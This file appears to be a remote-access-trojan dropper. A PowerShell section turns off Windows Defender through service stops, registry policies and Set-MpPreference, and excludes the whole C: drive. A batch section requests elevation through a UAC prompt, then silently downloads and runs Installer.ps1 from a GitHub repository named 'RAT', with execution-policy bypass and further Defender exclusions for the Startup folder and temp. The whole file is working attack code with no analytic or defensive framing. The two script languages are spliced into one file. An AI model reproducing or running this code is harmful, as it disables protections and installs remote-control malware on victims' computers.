try {
    Get-Service WinDefend | Stop-Service -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -value 4 -Type DWORD -Force
} 
catch {
    Write-Warning "Failed to disable WinDefend service"
}

try {
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    if (-Not ((Get-WmiObject -class Win32_OperatingSystem).Version -eq "6.1.7601")) {
        Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
        Set-MpPreference -DisableArchiveScanning $true  -ea 0 | Out-Null
        Set-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableCatchupFullScan $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableCatchupQuickScan $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableIntrusionPreventionSystem $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableIOAVProtection $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableRestorePoint $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableCScriptScanning $true -Force -ea 0 | Out-Null
        Set-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 | Out-Null
        Set-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0 | Out-Null
        Set-MpPreference -MAPSReporting Disabled -Force -ea 0 | Out-Null
        Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null
        Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null

    }
} 
catch {
  Write-Warning "Failed to Disabled Defender"
}

#cd $env:temp
#$directory_name = random_text
#mkdir $directory_name

@echo off
:: BatchGotAdmin
:: file that gives us admin priv to run and install other files

:-------------------------------------
REM  --> check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"


REM Rat resources
powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
powershell powershell.exe -windowstyle hidden -ep bypass ./Installer.ps1
@REM self delete
@REM del wget.cmd